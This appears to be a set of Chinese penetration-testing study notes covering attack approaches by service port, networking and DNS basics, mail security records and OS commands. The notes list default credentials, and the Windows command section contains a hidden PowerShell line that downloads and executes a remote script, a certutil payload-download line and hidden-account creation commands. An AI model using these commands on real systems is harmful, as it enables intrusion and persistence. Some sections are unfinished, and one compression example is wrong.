>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。
>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。
>（3）在注入点直接创建java，执行系统命令。（4）https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html


**2409**
NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。

>未授权访问。（https://www.freebuf.com/articles/network/159468.html） (http://www.secist.com/archives/6192.htm)

**3306**
3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:

>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。
>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。
>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。


**3389端口渗透剖析**
3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。

>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。
>（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。
>（3）Shift粘滞键后门：5次shift后门
>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（https://www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html


**4899端口**
是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：

>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。
>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。

**5432端口渗透剖析**

PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。

>（1）爆破：弱口令：postgres postgres
>（2）缓冲区溢出：CVE-2014-2669。（http://drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）


**5631端口渗透剖析**
5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。

>PcAnyWhere提权。（https://blog.csdn.net/Fly_hps/article/details/80377199）


**5900端口渗透剖析**
5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：

>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。
>（2）cain同样支持对VNC的嗅探，同时支持端口修改。
>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。（4）VNC拒绝服务攻击（CVE-2015-5239）。（http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）（5）VNC权限提升（CVE-2013-6886）。

**6379端口渗透剖析**

Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。这种数据库通常用来存储序列化后的字符串。

>（1）爆破：弱口令
>（2）未授权访问+配合ssh key提权。（http://www.alloyteam.com/2017/07/12910/）

**7001/7002端口渗透剖析**

7001/7002通常是weblogic中间件端口

>（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic
>（2）管理后台部署 war 后门
>（3）SSRF
>（4）反序列化漏洞
>（5）weblogic_uachttps://github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com


**8080端口渗透剖析**
8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：

>（1）Tomcat远程代码执行漏洞（https://www.freebuf.com/column/159200.html）
>（2）Tomcat任意文件上传。（http://liehu.tass.com.cn/archives/836）
>（3）Tomcat远程代码执行&信息泄露。（https://paper.seebug.org/399/）
>（4）Jboss远程代码执行。（http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）
>（5）Jboss反序列化漏洞。（https://www.zybuluo.com/websec007/note/838374）
>（6）Jboss漏洞利用。（https://blog.csdn.net/u011215939/article/details/79141624）

**27017端口渗透剖析**

MongoDB，NoSQL数据库；攻击方法与其他数据库类似

>（1）爆破：弱口令
>（2）未授权访问；（http://www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/1915




### 蜜罐

蜜罐成了今年的重头反制武器，攻击方小心翼翼，清空浏览器缓存、不敢用自己电脑。防守方也因为蜜罐的部署解决了往年被疯狂扫描的想象，由被动变为主动。蜜罐溯源反制终将成为一个常态化趋势~~~




#### OSI七层协议

**物理层**
传输对象：比特流
作用：从数据链路层接收帧，将比特流转换成底层物理介质上的信号
**数据链路层**
传输对象：帧
作用：在网络层实体间提供数据传输功能和控制
**网络层**
作用：负责端到端的数据的路由或交换，为透明地传输数据建立连接
**传输层**
作用：接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地
**会话层**
作用：提供提供节点之间通信过程的协调
**表示层**
传输对象：针对不同应用软件的编码格式
作用：提供数据格式、变换和编码转换
**应用层**
传输对象：各种应用如电子邮件、文件传输等

#### UDP

协议开销小、效率高。
UDP是无连接的，即发送数据之前不需要建立连接。
UDP使用尽最大努力交付，即不保证可靠交付。
UDP没有拥塞控制。
UDP支持一对一、一对多、多对一和多对多交互通信。
UDP的首部开销小，只有8个字节。

#### TCP

三次握手（Three-Way Handshake）是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。

第一次握手客户端将标志位 SYN 置为1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。

第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 置为1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。

第三次握手客户端收到确认后，检查ack值是否为s+1，ACK标志位是否为1，如果正确则将标志位 ACK 置为1，ack=k+1，并将该数据包发送给服务端，服务端检查ack值是否为k+1，ACK标志位是否为1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210611223014983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


四次挥手（Four-Way Wavehand）指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。

第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。

第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号+1，服务端进入 CLOSE_WAIT 状态。

第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。

第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号+1，服务端进入 CLOSED 状态，完成四次挥手。

#### 	DHCP协议

动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。

#### 路由算法

路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。
**自治系统 AS (Autonomous System)**
经典定义：
由一个组织管理的一整套路由器和网络。
使用一种AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。
使用一种 AS 之间的路由选择协议用以确定分组在AS之间的路由。
尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。

### DNS

#### DNS基础

**什么是**
通俗地说，DNS帮助用户在互联网上寻找路径。在互联网上的每一个计算机都拥有一个唯一的地址，称作“IP地址”（即互联网协议地址）。由于IP地址（为一串数字）不方便记忆，DNS允许用户使用一串常见的字母（即“域名”）取代。DNS命名用于Internet等TCP/IP网络中，通过用户友好的名称查找计算机和服务。当用户在应用程序中输入DNS名称时，DNS服务可以将此名称解析为与之相关的其他信息，如IP地址。因为，你在上网时输入的网址，是通过域名解析系解析找到相对应的IP地址，这样才能上网。其实，域名的最终指向是IP。

虽然域名系统后便于人们记忆，但网络中的计算机之间只能互相认识IP地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名服务器（Domain Name Server）来完成，这里的DNS就是域名服务器。


**DNS解析过程**
DNS解析过程是递归查询的，具体过程如下：

用户要访问域名www.example.com时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址
递归缓存为空时，首先向根服务器查询com顶级域的IP地址
根服务器告知递归服务器com顶级域名服务器的IP地址
递归向com顶级域名服务器查询负责exa mple.com的权威服务器的IP
com顶级域名服务器返回相应的IP地址
递归向example.com的权威服务器查询www.example.com的地址记录
权威服务器告知www.example.com的地址记录
递归服务器将查询结果返回客户端


**DGA**
DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C&C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。

通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。

DGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。

 **DNS隧道**
DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。

#### 相关漏洞

当黑客利用域名系统 (DNS) 中的漏洞时，我们称之为 DNS 攻击。

一些最常见的 DNS 攻击类型是 DDoS 攻击、DNS 重新绑定攻击、缓存中毒、分布式反射 DoS 攻击、DNS 隧道、DNS 劫持、基本 NXDOMAIN 攻击、幻像域攻击、随机子域攻击、TCP SYN Floods 和域锁定攻击。我们将在本文中逐一介绍。

##### DDoS 攻击

一个分布式拒绝服务（DDoS）攻击是一种恶意企图轰击网络或互联网流量及其周边基础设施的中断有针对性的网络或服务器的正常交通。尽管 DDoS 不一定是 DNS 攻击，但 DNS 系统是一个受欢迎的目标。
DDoS 攻击通过使用多个受感染的计算机系统作为攻击流量的来源来实现有效性。通常，攻击者会部署机器人来用流量轰炸目标。仅使用一个机器人的情况称为拒绝服务 (DoS) 攻击，主要是本地化的或影响很小。另一方面，DDoS 具有更广泛的影响，需要更多资源。

被利用的机器可能包括计算机和其他网络资源，例如物联网 (IoT) 设备。为了更好地了解 DDoS 攻击的工作原理，请想象一条人为地塞满汽车的高速公路，从而阻止正常交通并导致交通拥堵。

针对 DNS 的 DDoS 攻击有很多种类型，我们将在下面讨论其中的一些。

最大的 DDoS 攻击之一是 Dyn DNS 攻击。Dyn 是一家互联网性能管理 (IPM) 公司 - 一家领先的 DNS 服务提供商。Dyn 攻击发生在 2016 年 10 月 21 日。它影响了美国和欧洲的大部分互联网。攻击源是 Mirai 僵尸网络，由打印机、互联网协议 (IP) 摄像机和数字录像机等物联网设备组成。

##### DNS劫持

DNS劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造DNS响应的方法，来将域名解析到恶意的IP地址。

随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。

在windows用户下，用户只需要修改其C:\WINDOWS\System32\drivers\etc\host文件，将文件改成钓鱼链接，就可以达到欺骗用户账号密码的效果

##### DNS中毒

DNS中毒攻击通常发生的方式是这样的： 

攻击者冒充 DNS 名称服务器
他们向 DNS 解析器发出请求 
他们在真正的 DNS 名称服务器可以回答之前伪造对 DNS 解析器的回复 
DNS 请求和查询使用 UDP（用户数据报协议），它不需要握手来验证接收者是他们声称的身份。通过这个 UDP 漏洞，攻击者可以发送带有虚假标头数据的伪造响应，将连接路由到其他地方。

由于无法检查条目是否真实，DNS 解析器会自动缓存数据。这意味着缓存现在已中毒，它将一直处于中毒状态，直到条目的生存时间 (TTL) 到期，或者手动刷新 DNS 缓存。 

每次用户尝试输入攻击者篡改的某个网址时，您的浏览器都会从缓存中检索错误的地址，因为它更快。 

尽管 DNS 缓存过程中似乎存在内置安全漏洞，但 DNS 中毒攻击并不容易。为了使缓存中毒，攻击者有很短的时间进入中间并在来自正确名称服务器的实际响应返回之前发送假回复。

最重要的是，要成功欺骗用户，攻击者需要了解几个外部因素。例如，DNS 解析器可能使用随机端口、请求 ID 号、查询的实际名称服务器等。没有这些信息，攻击将不会成功。

#### 邮件协议族

 **SMTP**
SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。

以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。
在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：
信封
信的内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210621125439191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 **POP3**
POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。

 **IMAP**
IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。

#### 邮件安全协议

SMTP相关安全协议 - SPF
发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。

https://www.ietf.org/rfc/rfc4408.txt

"v=spf1 mx ip4:61.0.2.0/24 ~all"

设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。

SMTP相关安全协议 - DKIM
DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。

https://tools.ietf.org/html/rfc6376

SMTP相关安全协议 - DMARC
DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。

![2020-02-05-07-06-09](https://img-blog.csdnimg.cn/20210621124953351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


https://en.wikipedia.org/wiki/DMARC#Alignment

### HTTP/HTTPS基础知识

HTTPS 的原理，具体的加密算法、加密过程

##### cookie含义

expires:当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。
httponly：限制Cookie仅在HTTP传输过程中被读取，一定程度上防御XSS攻击。

#### 访问类型

get传参与post传参的区别
 -- get限制传参长度、post没有限制
 -- get在url可见、post相对隐蔽（但是抓包都一样）

#### 状态码

HTTP 30X 响应码的安全问题
301（永久移动） 请求的网页已被永久移动到新位置。服务器返回此响应时，会自动将请求者转到新位置。您应使用此代码通知搜索引擎蜘蛛网页或网站已被永久移动到新位置。

302（临时移动） 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。会自动将请求者转到不同的位置。但由于搜索引擎会继续抓取原有位置并将其编入索引，因此您不应使用此代码来告诉搜索引擎页面或网站已被移动。

303（查看其他位置） 当请求者应对不同的位置进行单独的 GET 请求以检索响应时，服务器会返回此代码。对于除 HEAD 请求之外的所有请求，服务器会自动转到其他位置。

304（未修改） 自从上次请求后，请求的网页未被修改过。服务器返回此响应时，不会返回网页内容。

305（使用代理） 请求者只能使用代理访问请求的网页。如果服务器返回此响应，那么，服务器还会指明请求者应当使用的代理。

307（临时重定向） 服务器目前正从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。会自动将请求者转到不同的位置。但由于搜索引擎会继续抓取原有位置并将其编入索引，因此您不应使用此代码来告诉搜索引擎某个页面或网站已被移动。

400（错误请求） 服务器不理解请求的语法。

401（身份验证错误） 此页要求授权。您可能不希望将此网页纳入索引。

403（禁止） 服务器拒绝请求。

404（未找到） 服务器找不到请求的网页。例如，对于服务器上不存在的网页经常会返回此代码。



HTTPS多了SSL层，但一般而言这对于黑客而言于事无补。因为我们仍旧可以通过替换、伪造SSL证书或SSL剥离达到中间人攻击目的。

小网站通常买不起SSL证书，所以这些网站会签订私人的SSL证书，私人的SSL证书会提示网站是私密链接
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050621322069.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 代理

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625105740662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**正向代理**

> 

### 操作系统

#### Linux

https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html#

##### 更新安装列表

```bash
apt-get update
apt-get upgrade
apt-get dist-upgrade
```

##### 压缩

**tar**
tar是归档命令
-c表示创建
-v表示详细（可选）,如果我们想提取文件并“静默”提取，我们可以删除-v开关
-f写入或读取以下文件

```bash
压缩
 tar -cvf NB.tar nullbyte1 nullbyte2 nullbyte3
```

-x开关从压缩包中提取这些文件

```bash
解压
tar -xvf NB.tar
```

**gz**
后缀.gz

```bash
压缩
gzip NB.*
```

```bash
解压
gunzip NB.*
```


**bzip2**
后缀.bz2

```bash
压缩
gzip NB.*
```

```bash
解压
bunzip2 NB.*
```

重要目录 /etc/shadow

####  centos

#### Ubuntu

### 待完善：编程语言

#### PYTHON

装饰器，迭代器，yield
标准库线程安全的队列是哪一个？不安全的是哪一个？logging 是线程安全的吗？
python 适合的场景有哪些？当遇到计算密集型任务怎么办？
python 高并发解决方案？我希望听到 twisted->tornado->gevent，能扯到 golang，erlang 更好
python 进程 & 线程，多进程
python 闭包
python lambda

通过反序化的原理可以得出是有的

#### JAVASCRIPT

#### JAVA

#### PHP

经典函数



#### C



### Web容器分类

nginx 日志
IIS 日志
Apache日志
tomcat 日志

### 数据库

**经验**
一般配套数据库
asp,access
aspx,sqlserver
php,mysql
jsp,sqlserver+oracle
python,mongodb,mysql...

#### 关系型

关系型数据库是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。简单说，关系型数据库是由多张能互相连接的表组成的数据库。
一. 优点
1）都是使用表结构，格式一致，易于维护。
2）使用通用的 SQL 语言操作，使用方便，可用于复杂查询。
3）数据存储在磁盘中，安全。
二. 缺点
读写性能比较差，不能满足海量数据的高效率读写。
不节省空间。因为建立在关系模型上，就要遵循某些规则，比如数据中某字段值即使为空仍要分配空间。
固定的表结构，灵活度较低。

##### 关系型数据库代表

常见的关系型数据库有 Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft   
Access 和 MySQL 等。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151830704.png)

###### access

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111732997.png)
比其他数据库要低一等级，数据通常保存在源码下面。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111922835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
每个网站对应的数据库不一样，不像mysql或其他数据库一个网站对应一个数据库

###### mysql


 //连接登录mysql的 不是网站后台登录密码
 mysql库下的user表中--->一般是经过md5加密后的
mysql的网站注入，5.0以上和5.0以下有什么区别？

  5.0以下（一般都是2000年左右的没有更新的网站才有）没有information_schema这个系统表，无法列表名等，只能暴力跑表名。5.0以下是多用户单操作，5.0以上是多用户多操做。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151652986.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151920287.png)

3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？
**mysql 基本信息**

>默认端口：3306
>注释 `--`
>url使用注释一般要加上符号`+`,即`--+`。加号代表空格

mysql的管理员密码一般存放在哪

**信息收集**

```bash
use auxiliary/scanner/mysql/mysql_version
set rhosts 192.168.157.130
run
```


**mysql 日志**

#### 非关系型

非关系型数据库又被称为 NoSQL（Not Only SQL )，意为不仅仅是
SQL。通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。
一. 优点
非关系型数据库存储数据的格式可以是 key-value
形式、文档形式、图片形式等。使用灵活，应用场景广泛，而关系型数据库则只支持基础类型。
速度快，效率高。NoSQL 可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘。
海量数据的维护和处理非常轻松。
非关系型数据库具有扩展简单、高并发、高稳定性、成本低廉的优势。
可以实现数据的分布式处理。
二. 缺点
非关系型数据库暂时不提供 SQL 支持，学习和使用成本较高。
非关系数据库没有事务处理，没有保证数据的完整性和安全性。适合处理海量数据，但是不一定安全。
功能没有关系型数据库完善。


##### 非关系型数据库代表

常见的非关系型数据库有 Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase 等。


### 开源渗透测试标准

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521222032138.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521222305289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521222332114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### Linux

#### 常见有用命令

>passwd 修改管理员密码
>apt install -f 安装万能的依赖包大法 
>dpkg -i 加文件 可以安装deb格式的安装包 
>sudo gedit 调用超级权限
>leafpad /etc/apt/sources.list 查看源
>apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等
>apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名
>google-chrome-stable –no-sandbox 启动谷歌浏览器
>firefox XXXXXXXXX 可以使用firefox直接打开该网页
>shutdown -h now 关闭系统(1)
>init 0 关闭系统(2)
>telinit 0 关闭系统(3)
>shutdown -h hours:minutes &amp; 按预定时间关闭系统
>shutdown -c 取消按预定时间关闭系统
>shutdown -r now 重启(1)
>reboot 重启(2)
>logout 注销
>cd – 返回上次所在的目录
>touch 加文本名 创建文档
>bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件
>bzip2 file1 压缩一个叫做 ‘file1’ 的文件gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件
>gzip file1 压缩一个叫做 ‘file1’的文件
>gzip -9 file1 最大程度压缩
>rar x file1.rar 解压rar包
>unrar x file1.rar 解压rar包
>unzip file1.zip 解压一个zip格式压缩包

>Linux：
>service  iptables status   查看防火墙状态
>service  iptables start		开启防火墙
>service  iptables stop		关闭防火墙
>service  iptables restart 	重启防火墙



### windows



#### windows 不同系统

##### win10特殊功能

有linux子系统

#### windows 常见命令




Windows:

```bash
type   显示文本内容         type  1.txt
dir    显示当前目录内容
dir/s/b    查询文件 返回绝对路径，例如   dir/s/b  d:\a.php  查询D盘中a.php文件返回绝对路径     
								     dir c:\ /s /b *.txt  查询c盘中txt文件，并返回绝对路径
/b 显示文件夹或文件的名字
/s 显示指定目录和所有子目录中的文件
* 是通配符，可以代表任意字符串

del 删除文件

ipconfig /all    查看所有ip配置信息
net user         查看用户
net user ad   查看用户权限   ad为用户名
net user  username  password /add     username 和password为你要添加的账号和密码
net user  username$  password  /add     隐藏用户
net user   username    /del   删除  或者username$  删除隐藏
net localgroup administrators username /add         username为要添加管理员组别的用户
net localgroup administrators     查看所有用户包括隐藏
query user || qwinsta    查看管理员是否在线
tasklist /svc | find "Ter"，假如 TermService 的 PID 是 1592。查找远程桌面端口
netstat -ano | find "1592"，查看 TermService 使用的端口，如示例中的 3389
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.1/powershell.txt'))"
powershell 隐藏执行下载脚本
certutil.exe -urlcache -split -f “文件下载地址” d:\test.exe            将文件下载到d盘命名为test.exe
Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机上执行恶意EXE文件
```



# 信息收集

请重视本节，笔者读了很多关于信息收集的文章，这节尽可能的详细列举出你可以尝试的信息收集对象。对于很多万人挖的漏洞来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520155239679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
查询域名注册邮箱
通过备案号查询域名
反查注册邮箱#
反查注册人
通过注册人查询到的域名在查询邮箱
通过上一步邮箱去查询域名

## 待完善：我的搜集流程
### 网站
打开记事本记下我搜集的信息 ，按照以下步骤依次搜集

获取网站全貌
耗时：
> fofa ,shodan, zoomeye
> 查看源码结构：F12,（看架构，看数据包格式、命名技巧）httrack

找到真实ip
> 探索：nslookup,超级ping

发现网站敏感信息
> 搜索子域名：搜索引擎

靠运气：发现源码层面
>
>


## 信息搜集开源项目

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630204515852.png)

## github监控

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630211540820.png)

## web组成框架信息收集

### 源代码

通研究源代码，能够发现一些敏感目录。源代码获取可以直接右击。也可以利用httrack获取

查看header:contype
文件命名规则

### 操作系统

### 中间件

apache,iis,tomcat,nginx

## 被动信息收集

**查看网站使用的开源框架**

现在很多开发者已经特别懒了

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210517140611240.png)


**企业附属品**

采购巩固、版权声明

专利

软著

知识产权

附属子孙公司：这个可以会找到目标系统网络相互可通


GET /member/index.php HTTP/1.1
Host: chengdabai.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
